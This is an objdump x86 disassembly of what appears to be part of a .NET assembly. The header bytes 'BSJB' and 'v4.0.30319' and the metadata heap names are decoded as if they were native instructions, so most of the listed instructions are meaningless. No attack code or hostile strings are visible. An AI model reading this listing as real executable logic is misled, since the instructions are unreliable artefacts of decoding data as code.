  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 06                	or     (%esi),%al
  4056c9:	17                   	pop    %ss
  4056ca:	73 10                	jae    0x4056dc
  4056cc:	01 00                	add    %eax,(%eax)
  4056ce:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4056d1:	02 16                	add    (%esi),%dl
  4056d3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4056d9:	00 0a                	add    %cl,(%edx)
  4056db:	08 6f 4f             	or     %ch,0x4f(%edi)
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	0a de                	or     %dh,%bl
  4056e2:	0a 08                	or     (%eax),%cl
  4056e4:	2c 06                	sub    $0x6,%al
  4056e6:	08 6f 33             	or     %ch,0x33(%edi)
  4056e9:	00 00                	add    %al,(%eax)
  4056eb:	0a dc                	or     %ah,%bl
  4056ed:	06                   	push   %es
  4056ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ef:	09 01                	or     %eax,(%ecx)
  4056f1:	00 0a                	add    %cl,(%edx)
  4056f3:	0d de 0a 06 2c       	or     $0x2c060ade,%eax
  4056f8:	06                   	push   %es
  4056f9:	06                   	push   %es
  4056fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4056fb:	33 00                	xor    (%eax),%eax
  4056fd:	00 0a                	add    %cl,(%edx)
  4056ff:	dc 09                	fmull  (%ecx)
  405701:	2a 00                	sub    (%eax),%al
  405703:	00 01                	add    %al,(%ecx)
  405705:	1c 00                	sbb    $0x0,%al
  405707:	00 02                	add    %al,(%edx)
  405709:	00 20                	add    %ah,(%eax)
  40570b:	00 13                	add    %dl,(%ebx)
  40570d:	33 00                	xor    (%eax),%eax
  40570f:	0a 00                	or     (%eax),%al
  405711:	00 00                	add    %al,(%eax)
  405713:	00 02                	add    %al,(%edx)
  405715:	00 06                	add    %al,(%esi)
  405717:	00 40 46             	add    %al,0x46(%eax)
  40571a:	00 0a                	add    %cl,(%edx)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 00                	add    %al,(%eax)
  405720:	42                   	inc    %edx
  405721:	53                   	push   %ebx
  405722:	4a                   	dec    %edx
  405723:	42                   	inc    %edx
  405724:	01 00                	add    %eax,(%eax)
  405726:	01 00                	add    %eax,(%eax)
  405728:	00 00                	add    %al,(%eax)
  40572a:	00 00                	add    %al,(%eax)
  40572c:	0c 00                	or     $0x0,%al
  40572e:	00 00                	add    %al,(%eax)
  405730:	76 34                	jbe    0x405766
  405732:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405735:	33 30                	xor    (%eax),%esi
  405737:	33 31                	xor    (%ecx),%esi
  405739:	39 00                	cmp    %eax,(%eax)
  40573b:	00 00                	add    %al,(%eax)
  40573d:	00 05 00 6c 00 00    	add    %al,0x6c00
  405743:	00 64 1d 00          	add    %ah,0x0(%ebp,%ebx,1)
  405747:	00 23                	add    %ah,(%ebx)
  405749:	7e 00                	jle    0x40574b
  40574b:	00 d0                	add    %dl,%al
  40574d:	1d 00 00 9c 26       	sbb    $0x269c0000,%eax
  405752:	00 00                	add    %al,(%eax)
  405754:	23 53 74             	and    0x74(%ebx),%edx
  405757:	72 69                	jb     0x4057c2
  405759:	6e                   	outsb  %ds:(%esi),(%dx)
  40575a:	67 73 00             	addr16 jae 0x40575d
  40575d:	00 00                	add    %al,(%eax)
  40575f:	00 6c 44 00          	add    %ch,0x0(%esp,%eax,2)
  405763:	00 a0 27 00 00 23    	add    %ah,0x23000027(%eax)
  405769:	55                   	push   %ebp
  40576a:	53                   	push   %ebx
  40576b:	00 0c 6c             	add    %cl,(%esp,%ebp,2)
  40576e:	00 00                	add    %al,(%eax)
  405770:	10 00                	adc    %al,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	23 47 55             	and    0x55(%edi),%eax
  405777:	49                   	dec    %ecx
  405778:	44                   	inc    %esp
  405779:	00 00                	add    %al,(%eax)
  40577b:	00 1c 6c             	add    %bl,(%esp,%ebp,2)
  40577e:	00 00                	add    %al,(%eax)
  405780:	68 09 00 00 23       	push   $0x23000009
  405785:	42                   	inc    %edx
  405786:	6c                   	insb   (%dx),%es:(%edi)
  405787:	6f                   	outsl  %ds:(%esi),(%dx)
  405788:	62 00                	bound  %eax,(%eax)
  40578a:	00 00                	add    %al,(%eax)
  40578c:	00 00                	add    %al,(%eax)
  40578e:	00 00                	add    %al,(%eax)
  405790:	02 00                	add    (%eax),%al
  405792:	00 01                	add    %al,(%ecx)
  405794:	57                   	push   %edi
  405795:	9f                   	lahf
  405796:	a2 3f 09 0a 00       	mov    %al,0xa093f
  40579b:	00 00                	add    %al,(%eax)
  40579d:	fa                   	cli
  40579e:	25 33 00 16 00       	and    $0x160033,%eax
  4057a3:	00 01                	add    %al,(%ecx)
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 9b 00 00 00 1d    	add    %bl,0x1d000000(%ebx)
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 45 00             	add    %al,0x0(%ebp)
  4057b2:	00 00                	add    %al,(%eax)
  4057b4:	a1 00 00 00 6e       	mov    0x6e000000,%eax
  4057b9:	00 00                	add    %al,(%eax)
  4057bb:	00 02                	add    %al,(%edx)
  4057bd:	00 00                	add    %al,(%eax)
  4057bf:	00 10                	add    %dl,(%eax)
  4057c1:	01 00                	add    %eax,(%eax)
  4057c3:	00 13                	add    %dl,(%ebx)
  4057c5:	00 00                	add    %al,(%eax)
  4057c7:	00 2d 00 00 00 02    	add    %ch,0x2000000
  4057cd:	00 00                	add    %al,(%eax)
  4057cf:	00 2e                	add    %ch,(%esi)
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 04 00             	add    %al,(%eax,%eax,1)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	12 00                	adc    (%eax),%al
  4057da:	00 00                	add    %al,(%eax)
  4057dc:	1e                   	push   %ds
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	00 04 00             	add    %al,(%eax,%eax,1)
  4057e2:	00 00                	add    %al,(%eax)
  4057e4:	02 00                	add    (%eax),%al
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	06                   	push   %es
  4057e9:	00 00                	add    %al,(%eax)
  4057eb:	00 04 00             	add    %al,(%eax,%eax,1)
  4057ee:	00 00                	add    %al,(%eax)
  4057f0:	02 00                	add    (%eax),%al
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	01 00                	add    %eax,(%eax)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	08 00                	or     %al,(%eax)
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	04 00                	add    $0x0,%al
  4057fe:	00 00                	add    %al,(%eax)
  405800:	03 00                	add    (%eax),%eax
  405802:	00 00                	add    %al,(%eax)
  405804:	00 00                	add    %al,(%eax)
  405806:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405807:	24 01                	and    $0x1,%al
  405809:	00 00                	add    %al,(%eax)
  40580b:	00 00                	add    %al,(%eax)
  40580d:	00 06                	add    %al,(%esi)
  40580f:	00 7b 20             	add    %bh,0x20(%ebx)
  405812:	c3                   	ret
  405813:	17                   	pop    %ss
  405814:	0a 00                	or     (%eax),%al
  405816:	4c                   	dec    %esp
  405817:	00 2a                	add    %ch,(%edx)
  405819:	1e                   	push   %ds
  40581a:	0a 00                	or     (%eax),%al
  40581c:	a8 20                	test   $0x20,%al
  40581e:	c2 1f 0a             	ret    $0xa1f
  405821:	00 77 17             	add    %dh,0x17(%edi)
  405824:	e6 25                	out    %al,$0x25
  405826:	06                   	push   %es
  405827:	00 3e                	add    %bh,(%esi)
  405829:	1c 44                	sbb    $0x44,%al
  40582b:	13 06                	adc    (%esi),%eax
  40582d:	00 cc                	add    %cl,%ah
  40582f:	0f 2a 1e             	cvtpi2ps (%esi),%xmm3
  405832:	0a 00                	or     (%eax),%al
  405834:	7f 18                	jg     0x40584e
  405836:	2a 1e                	sub    (%esi),%bl
  405838:	0a 00                	or     (%eax),%al
  40583a:	8b 1f                	mov    (%edi),%ebx
  40583c:	e6 25                	out    %al,$0x25
  40583e:	06                   	push   %es
  40583f:	00 05 21 c3 17 06    	add    %al,0x617c321
  405845:	00 73 13             	add    %dh,0x13(%ebx)
  405848:	a3 22 06 00 8b       	mov    %eax,0x8b000622
  40584d:	1c 35                	sbb    $0x35,%al
  40584f:	1f                   	pop    %ds
  405850:	06                   	push   %es
  405851:	00 24 00             	add    %ah,(%eax,%eax,1)
  405854:	65 0a 06             	or     %gs:(%esi),%al
  405857:	00 b7 0d 35 1f 06    	add    %dh,0x61f350d(%edi)
  40585d:	00 9f 17 52 05 06    	add    %bl,0x6055217(%edi)
  405863:	00 2a                	add    %ch,(%edx)
  405865:	18 c3                	sbb    %al,%bl
  405867:	17                   	pop    %ss
  405868:	0a 00                	or     (%eax),%al
  40586a:	b0 1f                	mov    $0x1f,%al
  40586c:	62 1d 0e 00 05 1a    	bound  %ebx,0x1a05000e
  405872:	80 13 0e             	adcb   $0xe,(%ebx)
  405875:	00 49 20             	add    %cl,0x20(%ecx)
  405878:	80 13 06             	adcb   $0x6,(%ebx)
  40587b:	00 b2 24 44 13 0a    	add    %dh,0xa134424(%edx)
  405881:	00 bd 1e 2b 00 12    	add    %bh,0x12002b1e(%ebp)
  405887:	00 19                	add    %bl,(%ecx)
  405889:	00 c2                	add    %al,%dl
  40588b:	1d 12 00 01 00       	sbb    $0x10012,%eax
  405890:	c3                   	ret
  405891:	17                   	pop    %ss
  405892:	12 00                	adc    (%eax),%al
  405894:	02 10                	add    (%eax),%dl
  405896:	c2 1d 06             	ret    $0x61d
  405899:	00 6d 0f             	add    %ch,0xf(%ebp)
  40589c:	c3                   	ret
  40589d:	17                   	pop    %ss
  40589e:	06                   	push   %es
  40589f:	00 0f                	add    %cl,(%edi)
  4058a1:	11 c2                	adc    %eax,%edx
  4058a3:	1d 06 00 7c 11       	sbb    $0x117c0006,%eax
  4058a8:	c2 1d 06             	ret    $0x61d
  4058ab:	00 2c 10             	add    %ch,(%eax,%edx,1)
  4058ae:	62 1d 6f 00 e2 1d    	bound  %ebx,0x1de2006f
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	06                   	push   %es
  4058b7:	00 54 10 15          	add    %dl,0x15(%eax,%edx,1)
  4058bb:	19 06                	sbb    %eax,(%esi)
  4058bd:	00 db                	add    %bl,%bl
  4058bf:	10 15 19 06 00 bc    	adc    %dl,0xbc000619
  4058c5:	10 15 19 06 00 63    	adc    %dl,0x63000619
  4058cb:	11 15 19 06 00 2f    	adc    %edx,0x2f000619
  4058d1:	11 15 19 06 00 48    	adc    %edx,0x48000619
  4058d7:	11 15 19 06 00 6b    	adc    %edx,0x6b000619
  4058dd:	10 15 19 06 00 40    	adc    %dl,0x40000619
  4058e3:	10 a3 1d 06 00 9f    	adc    %ah,-0x60fff9e3(%ebx)
  4058e9:	10 15 19 06 00 86    	adc    %dl,0x86000619
  4058ef:	10 97 13 06 00 11    	adc    %dl,0x11000613(%edi)
  4058f5:	10 c2                	adc    %al,%dl
  4058f7:	1d 06 00 f8 10       	sbb    $0x10f80006,%eax
  4058fc:	15 19 06 00 21       	adc    $0x21000619,%eax
  405901:	0b 44 13 06          	or     0x6(%ebx,%edx,1),%eax
  405905:	00 4f 22             	add    %cl,0x22(%edi)
  405908:	c3                   	ret
  405909:	17                   	pop    %ss
  40590a:	06                   	push   %es
  40590b:	00 9d 21 c3 17 06    	add    %bl,0x617c321(%ebp)
  405911:	00 12                	add    %dl,(%edx)
  405913:	18 c3                	sbb    %al,%bl
  405915:	17                   	pop    %ss
  405916:	06                   	push   %es
  405917:	00 77 13             	add    %dh,0x13(%edi)
  40591a:	a3 22 0a 00 43       	mov    %eax,0x43000a22
  40591f:	25 2a 1e 06 00       	and    $0x61e2a,%eax
  405924:	eb 17                	jmp    0x40593d
  405926:	59                   	pop    %ecx
  405927:	25 06 00 6b 1b       	and    $0x1b6b0006,%eax
  40592c:	59                   	pop    %ecx
  40592d:	25 06 00 25 13       	and    $0x13250006,%eax
  405932:	59                   	pop    %ecx
  405933:	25 06 00 9e 19       	and    $0x199e0006,%eax
  405938:	c3                   	ret
  405939:	17                   	pop    %ss
  40593a:	0a 00                	or     (%eax),%al
  40593c:	b8 1f 96 20 0a       	mov    $0xa20961f,%eax
  405941:	00 34 21             	add    %dh,(%ecx,%eiz,1)
  405944:	96                   	xchg   %eax,%esi
  405945:	20 0a                	and    %cl,(%edx)
  405947:	00 6b 16             	add    %ch,0x16(%ebx)
  40594a:	96                   	xchg   %eax,%esi
  40594b:	20 0a                	and    %cl,(%edx)
  40594d:	00 7f 25             	add    %bh,0x25(%edi)
  405950:	c2 1f 0a             	ret    $0xa1f
  405953:	00 8c 0f c2 1f 0a 00 	add    %cl,0xa1fc2(%edi,%ecx,1)
  40595a:	77 0f                	ja     0x40596b
  40595c:	c2 1f 06             	ret    $0x61f
  40595f:	00 06                	add    %al,(%esi)
  405961:	14 c3                	adc    $0xc3,%al
  405963:	17                   	pop    %ss
  405964:	06                   	push   %es
  405965:	00 40 1b             	add    %al,0x1b(%eax)
  405968:	c3                   	ret
  405969:	17                   	pop    %ss
  40596a:	0a 00                	or     (%eax),%al
  40596c:	28 1f                	sub    %bl,(%edi)
  40596e:	96                   	xchg   %eax,%esi
  40596f:	20 0a                	and    %cl,(%edx)
  405971:	00 e2                	add    %ah,%dl
  405973:	1e                   	push   %ds
  405974:	96                   	xchg   %eax,%esi
  405975:	20 06                	and    %al,(%esi)
  405977:	00 48 1f             	add    %cl,0x1f(%eax)
  40597a:	c3                   	ret
  40597b:	17                   	pop    %ss
  40597c:	06                   	push   %es
  40597d:	00 c3                	add    %al,%bl
  40597f:	0d c3 17 0a 00       	or     $0xa17c3,%eax
  405984:	69 17 c2 1f 0a 00    	imul   $0xa1fc2,(%edi),%edx
  40598a:	a2 15 e6 25 0a       	mov    %al,0xa25e615
  40598f:	00 04 22             	add    %al,(%edx,%eiz,1)
  405992:	96                   	xchg   %eax,%esi
  405993:	20 0a                	and    %cl,(%edx)
  405995:	00 27                	add    %ah,(%edi)
  405997:	19 2a                	sbb    %ebp,(%edx)
  405999:	1e                   	push   %ds
  40599a:	0a 00                	or     (%eax),%al
  40599c:	06                   	push   %es
  40599d:	1f                   	pop    %ds
  40599e:	f6 18                	negb   (%eax)
  4059a0:	06                   	push   %es
  4059a1:	00 bc 11 c3 17 06 00 	add    %bh,0x617c3(%ecx,%edx,1)
  4059a8:	c6                   	(bad)
  4059a9:	15 44 13 06 00       	adc    $0x61344,%eax
  4059ae:	94                   	xchg   %eax,%esp
  4059af:	15 c3 17 0a 00       	adc    $0xa17c3,%eax
  4059b4:	15 15 c3 17 0a       	adc    $0xa17c315,%eax
  4059b9:	00 59 0f             	add    %bl,0xf(%ecx)
  4059bc:	c3                   	ret
  4059bd:	17                   	pop    %ss
  4059be:	06                   	push   %es
  4059bf:	00 76 1c             	add    %dh,0x1c(%esi)
  4059c2:	c3                   	ret
  4059c3:	17                   	pop    %ss
  4059c4:	06                   	push   %es
  4059c5:	00 36                	add    %dh,(%esi)
  4059c7:	22 44 13 06          	and    0x6(%ebx,%edx,1),%al
  4059cb:	00 99 17 52 05 06    	add    %bl,0x6055217(%ecx)
  4059d1:	00 f6                	add    %dh,%dh
  4059d3:	1c 44                	sbb    $0x44,%al
  4059d5:	13 0a                	adc    (%edx),%ecx
  4059d7:	00 88 0d c2 1f 06    	add    %cl,0x61fc20d(%eax)
  4059dd:	00 f9                	add    %bh,%cl
  4059df:	00 c3                	add    %al,%bl
  4059e1:	17                   	pop    %ss
  4059e2:	06                   	push   %es
  4059e3:	00 9d 1b a3 22 33    	add    %bl,0x3322a31b(%ebp)
  4059e9:	00 d4                	add    %dl,%ah
  4059eb:	1c 00                	sbb    $0x0,%al
  4059ed:	00 06                	add    %al,(%esi)
  4059ef:	00 68 00             	add    %ch,0x0(%eax)
  4059f2:	c3                   	ret
  4059f3:	17                   	pop    %ss
  4059f4:	06                   	push   %es
  4059f5:	00 5f 00             	add    %bl,0x0(%edi)
  4059f8:	c3                   	ret
  4059f9:	17                   	pop    %ss
  4059fa:	06                   	push   %es
  4059fb:	00 d1                	add    %dl,%cl
  4059fd:	0d c3 17 06 00       	or     $0x617c3,%eax
  405a02:	37                   	aaa
  405a03:	0e                   	push   %cs
  405a04:	c3                   	ret
  405a05:	17                   	pop    %ss
  405a06:	06                   	push   %es
  405a07:	00 1c 0f             	add    %bl,(%edi,%ecx,1)
  405a0a:	c3                   	ret
  405a0b:	17                   	pop    %ss
  405a0c:	06                   	push   %es
  405a0d:	00 5e 17             	add    %bl,0x17(%esi)
  405a10:	52                   	push   %edx
  405a11:	05 06 00 3e 0e       	add    $0xe3e0006,%eax
  405a16:	52                   	push   %edx
  405a17:	05 06 00 38 0d       	add    $0xd380006,%eax
  405a1c:	52                   	push   %edx
  405a1d:	05 06 00 9b 1f       	add    $0x1f9b0006,%eax
  405a22:	52                   	push   %edx
  405a23:	05 06 00 97 0f       	add    $0xf970006,%eax
  405a28:	52                   	push   %edx
  405a29:	05 06 00 7c 1f       	add    $0x1f7c0006,%eax
  405a2e:	c2 1d 06             	ret    $0x61d
  405a31:	00 11                	add    %dl,(%ecx)
  405a33:	25 c3 17 06 00       	and    $0x617c3,%eax
  405a38:	e3 0d                	jecxz  0x405a47
  405a3a:	c3                   	ret
  405a3b:	17                   	pop    %ss
  405a3c:	06                   	push   %es
  405a3d:	00 64 18 c3          	add    %ah,-0x3d(%eax,%ebx,1)
  405a41:	17                   	pop    %ss
  405a42:	06                   	push   %es
  405a43:	00 14 1a             	add    %dl,(%edx,%ebx,1)
  405a46:	52                   	push   %edx
  405a47:	05 0a 00 64 1a       	add    $0x1a64000a,%eax
  405a4c:	62 1d 06 00 4d 25    	bound  %ebx,0x254d0006
  405a52:	2b 00                	sub    (%eax),%eax
  405a54:	06                   	push   %es
  405a55:	00 58 1c             	add    %bl,0x1c(%eax)
  405a58:	52                   	push   %edx
  405a59:	05 06 00 b2 14       	add    $0x14b20006,%eax
  405a5e:	52                   	push   %edx
  405a5f:	05 0a 00 6e 0e       	add    $0xe6e000a,%eax
  405a64:	62 1d 06 00 27 1a    	bound  %ebx,0x1a270006
  405a6a:	52                   	push   %edx
  405a6b:	05 0a 00 8c 0e       	add    $0xe8c000a,%eax
  405a70:	62 1d 06 00 c3 25    	bound  %ebx,0x25c30006
  405a76:	2b 00                	sub    (%eax),%eax
  405a78:	16                   	push   %ss
  405a79:	00 b5 1e 80 0a 06    	add    %dh,0x60a801e(%ebp)
  405a7f:	00 d4                	add    %dl,%ah
  405a81:	15 2b 00 06 00       	adc    $0x6002b,%eax
  405a86:	65 1c 52             	gs sbb $0x52,%al
  405a89:	05 06 00 1d 1a       	add    $0x1a1d0006,%eax
  405a8e:	52                   	push   %edx
  405a8f:	05 16 00 36 1a       	add    $0x1a360016,%eax
  405a94:	85 1d 1a 00 0b 1c    	test   %ebx,0x1c0b001a
  405a9a:	8b 21                	mov    (%ecx),%esp
  405a9c:	1a 00                	sbb    (%eax),%al
  405a9e:	41                   	inc    %ecx
  405a9f:	19 8b 21 bb 01 97    	sbb    %ecx,-0x68fe44df(%ebx)
  405aa5:	1c 00                	sbb    $0x0,%al
  405aa7:	00 1a                	add    %bl,(%edx)
  405aa9:	00 6d 20             	add    %ch,0x20(%ebp)
  405aac:	8b 21                	mov    (%ecx),%esp
  405aae:	06                   	push   %es
  405aaf:	00 2e                	add    %ch,(%esi)
  405ab1:	1d c3 17 06 00       	sbb    $0x617c3,%eax
  405ab6:	46                   	inc    %esi
  405ab7:	00 c3                	add    %al,%bl
  405ab9:	17                   	pop    %ss
  405aba:	12 00                	adc    (%eax),%al
  405abc:	b8 0d 05 1b 06       	mov    $0x61b050d,%eax
  405ac1:	00 0b                	add    %cl,(%ebx)
  405ac3:	00 65 0a             	add    %ah,0xa(%ebp)
  405ac6:	06                   	push   %es
  405ac7:	00 ba 17 c3 17 06    	add    %bh,0x617c317(%edx)
  405acd:	00 52 1b             	add    %dl,0x1b(%edx)
  405ad0:	59                   	pop    %ecx
  405ad1:	25 06 00 ff 17       	and    $0x17ff0006,%eax
  405ad6:	59                   	pop    %ecx
  405ad7:	25 1e 00 ea 18       	and    $0x18ea001e,%eax
  405adc:	13 1f                	adc    (%edi),%ebx
  405ade:	06                   	push   %es
  405adf:	00 fa                	add    %bh,%dl
  405ae1:	25 7d 16 06 00       	and    $0x6167d,%eax
  405ae6:	97                   	xchg   %eax,%edi
  405ae7:	16                   	push   %ss
  405ae8:	7d 16                	jge    0x405b00
  405aea:	06                   	push   %es
  405aeb:	00 4c 0e 7d          	add    %cl,0x7d(%esi,%ecx,1)
  405aef:	16                   	push   %ss
  405af0:	06                   	push   %es
  405af1:	00 82 0b c3 17 06    	add    %al,0x617c30b(%edx)
  405af7:	00 2a                	add    %ch,(%edx)
  405af9:	0e                   	push   %cs
  405afa:	44                   	inc    %esp
  405afb:	13 0a                	adc    (%edx),%ecx
  405afd:	00 24 1c             	add    %ah,(%esp,%ebx,1)
  405b00:	2b 00                	sub    (%eax),%eax
  405b02:	0a 00                	or     (%eax),%al
  405b04:	e3 1f                	jecxz  0x405b25
  405b06:	2b 00                	sub    (%eax),%eax
  405b08:	06                   	push   %es
  405b09:	00 a1 0c 2b 00 06    	add    %ah,0x6002b0c(%ecx)
  405b0f:	00 89 18 c3 17 06    	add    %cl,0x617c318(%ecx)
  405b15:	00 76 25             	add    %dh,0x25(%esi)
  405b18:	15 19 06 00 92       	adc    $0x92000619,%eax
  405b1d:	0f c3 17             	movnti %edx,(%edi)
  405b20:	06                   	push   %es
  405b21:	00 df                	add    %bl,%bh
  405b23:	1c c3                	sbb    $0xc3,%al
  405b25:	17                   	pop    %ss
  405b26:	06                   	push   %es
  405b27:	00 06                	add    %al,(%esi)
  405b29:	0e                   	push   %cs
  405b2a:	c3                   	ret
  405b2b:	17                   	pop    %ss
  405b2c:	22 00                	and    (%eax),%al
  405b2e:	43                   	inc    %ebx
  405b2f:	1a ab 1b 22 00 8b    	sbb    -0x74ffdde5(%ebx),%ch
  405b35:	1e                   	push   %ds
  405b36:	ab                   	stos   %eax,%es:(%edi)
  405b37:	1b 22                	sbb    (%edx),%esp
  405b39:	00 d2                	add    %dl,%dl
  405b3b:	1b ab 1b 12 00 ca    	sbb    -0x35ffede5(%ebx),%ebp
  405b41:	1b c2                	sbb    %edx,%eax
  405b43:	1d 22 00 a3 1e       	sbb    $0x1ea30022,%eax
  405b48:	ab                   	stos   %eax,%es:(%edi)
  405b49:	1b 06                	sbb    (%esi),%eax
  405b4b:	00 58 1e             	add    %bl,0x1e(%eax)
  405b4e:	59                   	pop    %ecx
  405b4f:	25 06 00 96 19       	and    $0x19960006,%eax
  405b54:	c3                   	ret
  405b55:	17                   	pop    %ss
  405b56:	06                   	push   %es
  405b57:	00 5f 1e             	add    %bl,0x1e(%edi)
  405b5a:	59                   	pop    %ecx
  405b5b:	25 12 00 84 1b       	and    $0x1b840012,%eax
  405b60:	59                   	pop    %ecx
  405b61:	25 06 00 81 17       	and    $0x17810006,%eax
  405b66:	59                   	pop    %ecx
  405b67:	25 06 00 7f 00       	and    $0x7f0006,%eax
  405b6c:	59                   	pop    %ecx
  405b6d:	25 06 00 80 19       	and    $0x19800006,%eax
  405b72:	c3                   	ret
  405b73:	17                   	pop    %ss
  405b74:	06                   	push   %es
  405b75:	00 d8                	add    %bl,%al
  405b77:	17                   	pop    %ss
  405b78:	59                   	pop    %ecx
  405b79:	25 06 00 7d 0d       	and    $0xd7d0006,%eax
  405b7e:	59                   	pop    %ecx
  405b7f:	25 06 00 41 0d       	and    $0xd410006,%eax
  405b84:	59                   	pop    %ecx
  405b85:	25 06 00 19 18       	and    $0x18190006,%eax
  405b8a:	59                   	pop    %ecx
  405b8b:	25 06 00 5c 0d       	and    $0xd5c0006,%eax
  405b90:	59                   	pop    %ecx
  405b91:	25 06 00 69 19       	and    $0x19690006,%eax
  405b96:	59                   	pop    %ecx
  405b97:	25 06 00 e8 1b       	and    $0x1be80006,%eax
  405b9c:	c3                   	ret
  405b9d:	17                   	pop    %ss
  405b9e:	06                   	push   %es
  405b9f:	00 42 0b             	add    %al,0xb(%edx)
  405ba2:	59                   	pop    %ecx
  405ba3:	25 0a 00 8e 17       	and    $0x178e000a,%eax
  405ba8:	d4 18                	aam    $0x18
  405baa:	0a 00                	or     (%eax),%al
  405bac:	6d                   	insl   (%dx),%es:(%edi)
  405bad:	0d d4 18 00 00       	or     $0x18d4,%eax
  405bb2:	00 00                	add    %al,(%eax)
  405bb4:	93                   	xchg   %eax,%ebx
  405bb5:	00 00                	add    %al,(%eax)
  405bb7:	00 00                	add    %al,(%eax)
  405bb9:	00 01                	add    %al,(%ecx)
  405bbb:	00 01                	add    %al,(%ecx)
  405bbd:	00 01                	add    %al,(%ecx)
  405bbf:	00 10                	add    %dl,(%eax)
  405bc1:	00 93 04 5c 05 05    	add    %dl,0x5055c04(%ebx)
  405bc7:	00 01                	add    %al,(%ecx)
  405bc9:	00 01                	add    %al,(%ecx)
  405bcb:	00 81 01 10 00 21    	add    %al,0x21001001(%ecx)
  405bd1:	03 5c 05 05          	add    0x5(%ebp,%eax,1),%ebx
  405bd5:	00 01                	add    %al,(%ecx)
  405bd7:	00 03                	add    %al,(%ebx)
  405bd9:	00 81 01 10 00 bd    	add    %al,-0x42ffefff(%ecx)
  405bdf:	04 50                	add    $0x50,%al
  405be1:	17                   	pop    %ss
  405be2:	05 00 12 00 06       	add    $0x6001200,%eax
  405be7:	00 01                	add    %al,(%ecx)
  405be9:	00 10                	add    %dl,(%eax)
  405beb:	00 47 07             	add    %al,0x7(%edi)
  405bee:	82 05 05 00 1c 00 22 	addb   $0x22,0x1c0005
  405bf5:	00 01                	add    %al,(%ecx)
  405bf7:	00 10                	add    %dl,(%eax)
  405bf9:	00 d0                	add    %dl,%al
  405bfb:	01 82 05 05 00 1d    	add    %eax,0x1d000505(%edx)
  405c01:	00 2d 00 01 00 10    	add    %ch,0x10000100
  405c07:	00 b9 07 82 05 05    	add    %bh,0x5058207(%ecx)
  405c0d:	00 1f                	add    %bl,(%edi)
  405c0f:	00 31                	add    %dh,(%ecx)
  405c11:	00 01                	add    %al,(%ecx)
  405c13:	00 10                	add    %dl,(%eax)
  405c15:	00 d0                	add    %dl,%al
  405c17:	16                   	push   %ss
  405c18:	82 05 05 00 21 00 38 	addb   $0x38,0x210005
  405c1f:	00 01                	add    %al,(%ecx)
  405c21:	01 00                	add    %eax,(%eax)
  405c23:	00 c8                	add    %cl,%al
  405c25:	07                   	pop    %es
  405c26:	82 05 3d 00 28 00 63 	addb   $0x63,0x28003d
  405c2d:	00 00                	add    %al,(%eax)
  405c2f:	00 10                	add    %dl,(%eax)
  405c31:	00 7d 09             	add    %bh,0x9(%ebp)
  405c34:	82 05 05 00 35 00 63 	addb   $0x63,0x350005
  405c3b:	00 00                	add    %al,(%eax)
  405c3d:	00 10                	add    %dl,(%eax)
  405c3f:	00 ba 06 82 05 05    	add    %bh,0x5058206(%edx)
  405c45:	00 35 00 67 00 00    	add    %dh,0x6700
  405c4b:	00 10                	add    %dl,(%eax)
  405c4d:	00 e2                	add    %ah,%dl
  405c4f:	05 d2 19 05 00       	add    $0x519d2,%eax
  405c54:	35 00 70 00 00       	xor    $0x7000,%eax
  405c59:	00 10                	add    %dl,(%eax)
  405c5b:	00 ec                	add    %ch,%ah
  405c5d:	1a ee                	sbb    %dh,%ch
  405c5f:	12 05 00 35 00 72    	adc    0x72003500,%al
  405c65:	00 00                	add    %al,(%eax)
  405c67:	00 10                	add    %dl,(%eax)
  405c69:	00 df                	add    %bl,%bh
  405c6b:	09 ee                	or     %ebp,%esi
  405c6d:	12 05 00 35 00 7b    	adc    0x7b003500,%al
  405c73:	00 81 01 10 00 8d    	add    %al,-0x72ffefff(%ecx)
  405c79:	25 ee 12 05 00       	and    $0x512ee,%eax
  405c7e:	35 00 7e 00 81       	xor    $0x81007e00,%eax
  405c83:	01 10                	add    %edx,(%eax)
  405c85:	00 0d 09 ee 12 05    	add    %cl,0x512ee09
  405c8b:	00 35 00 80 00 80    	add    %dh,0x80008000
  405c91:	01 10                	add    %edx,(%eax)
  405c93:	00 e4                	add    %ah,%ah
  405c95:	22 ee                	and    %dh,%ch
  405c97:	12 05 00 35 00 81    	adc    0x81003500,%al
  405c9d:	00 02                	add    %al,(%edx)
  405c9f:	01 00                	add    %eax,(%eax)
  405ca1:	00 8f 05 00 00 3d    	add    %cl,0x3d000005(%edi)
  405ca7:	00 35 00 87 00 81    	add    %dh,0x81008700
  405cad:	01 10                	add    %edx,(%eax)
  405caf:	00 11                	add    %dl,(%ecx)
  405cb1:	1b ee                	sbb    %esi,%ebp
  405cb3:	12 05 00 39 00 87    	adc    0x87003900,%al
  405cb9:	00 81 01 10 00 cb    	add    %al,-0x34ffefff(%ecx)
  405cbf:	03 ee                	add    %esi,%ebp
  405cc1:	12 05 00 3a 00 89    	adc    0x89003a00,%al
  405cc7:	00 81 01 10 00 9e    	add    %al,-0x61ffefff(%ecx)
  405ccd:	03 ee                	add    %esi,%ebp
  405ccf:	12 05 00 3a 00 8d    	adc    0x8d003a00,%al
  405cd5:	00 81 01 10 00 1d    	add    %al,0x1d001001(%ecx)
  405cdb:	04 dc                	add    $0xdc,%al
  405cdd:	0c 05                	or     $0x5,%al
  405cdf:	00 3b                	add    %bh,(%ebx)
  405ce1:	00 92 00 83 01 10    	add    %dl,0x10018300(%edx)
  405ce7:	00 22                	add    %ah,(%edx)
  405ce9:	02 00                	add    (%eax),%al
  405ceb:	00 05 00 3c 00 97    	add    %al,0x97003c00
